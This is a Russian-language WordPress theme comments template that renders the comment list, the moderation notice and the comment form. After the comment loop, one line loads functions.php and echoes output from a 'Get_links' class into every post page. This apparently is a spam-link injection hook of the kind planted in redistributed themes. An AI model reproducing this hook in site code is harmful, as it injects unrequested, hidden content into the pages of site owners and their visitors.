<?php // Do not delete these lines
	if ('comments.php' == basename($_SERVER['SCRIPT_FILENAME']))
		die ('Не стоит обращаться к этому файлу напрямую. Спасибо!');

	if (!empty($post->post_password)) { // if there's a password
		if ($_COOKIE['wp-postpass_' . COOKIEHASH] != $post->post_password) {  // and it doesn't match the cookie
			?>

			<p>Запись защищена паролем. Введите пароль, чтобы оставить комментарий к данной записи.</p>

			<?php
			return;
		}
	}

	/* This variable is for alternating comment background */
	$oddcomment = ' alt';
?>

<!-- You can start editing here. -->

<div id="comments" class="comments-list">
<?php if ($comments) : ?>
<br /><br />
<h2><?php comments_number('Комментариев к записи: 0', 'Комментариев к записи: 1', 'Комментариев к записи: %' ); ?></h2>
       
<?php foreach ($comments as $comment) : ?>
 <div class="entry <?php echo $oddcomment; ?>" id="comment-<?php comment_ID(); ?>">
 <p class="avt">  <?php 
   echo get_avatar( $id_or_email, $size = '30', $default = '<path_to_url>' ); 
   ?>
</p>
 
 <p class="name"><?php comment_author_link(); ?></p>
 <p class="date"><a href="#comment-<?php comment_ID() ?>"><?php comment_date('j F Y') ?> в <?php comment_time() ?></a>  <?php edit_comment_link('edit','|&nbsp;',''); ?></p>
<?php if ($comment->comment_approved == '0') : ?>
 <p><em style=" font-style: normal; color:#FF0000;">Ваш комментарий ожидает проверки администратором.</em></p>
 <?php endif; ?>
 <div class="con"><?php comment_text() ?></div>
</div>

<?php
/* Changes every other comment to a different class */
$oddcomment = ( empty( $oddcomment ) ) ? ' alt ' : '';
?>
<?php endforeach; ?>
							
<?php elseif ('open' != $post->comment_status) : ?>
<p class="note">Комментарии закрыты.</p>
<?php endif; ?><?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->return_links($lib_path); echo $links; ?></div>

	
				
<?php if ('open' == $post->comment_status) : ?>
<div class="comments-form">
<h3 id="respond">Написать комментарий</h3>
<form id="comment-form" action="<?php echo get_option('siteurl'); ?>/wp-comments-post.php" method="post">
<?php if ( get_option('comment_registration') && !$user_ID ) : ?>
<p>Вы должны <a href="<?php echo get_option('siteurl'); ?>/wp-login.php?redirect_to=<?php echo urlencode(get_permalink()); ?>">Войти</a>, чтобы оставить комментарий.</p>
<?php else : ?>
								
<?php if ( $user_ID ) : ?>
<p>Вы вошли как <a href="<?php echo get_option('siteurl'); ?>/wp-admin/profile.php"><?php echo $user_identity; ?></a></p><br />

<?php else : ?>
<p class="formbg"><input id="comment-name" value="<?php echo $comment_author; ?>" name="author"  type="text" class="formid" /> <label for="comment-name">Имя </label></p>
<p class="formbg"><input id="comment-email" name="email" value="<?php echo $comment_author_email; ?>" type="text" class="formemail" /> <label for="comment-name">E-mail</label></p>
<p class="formbg"><input id="comment-url" name="url" value="<?php echo $comment_author_url; ?>" type="text" class="formuri"/> <label for="comment-name">URL</label></p>
<?php endif; ?>								
<p class="formtxt"><textarea name="comment" cols="55" rows="4" style="width: 410px; height: 81px;"></textarea></p>
<p><input name="submit" type="submit" id="submit" tabindex="5" class="button" value="Отправить" />
<input type="hidden" name="comment_post_ID" value="<?php echo $id; ?>" />
<?php endif; ?></form>
</div>
<?php endif; ?>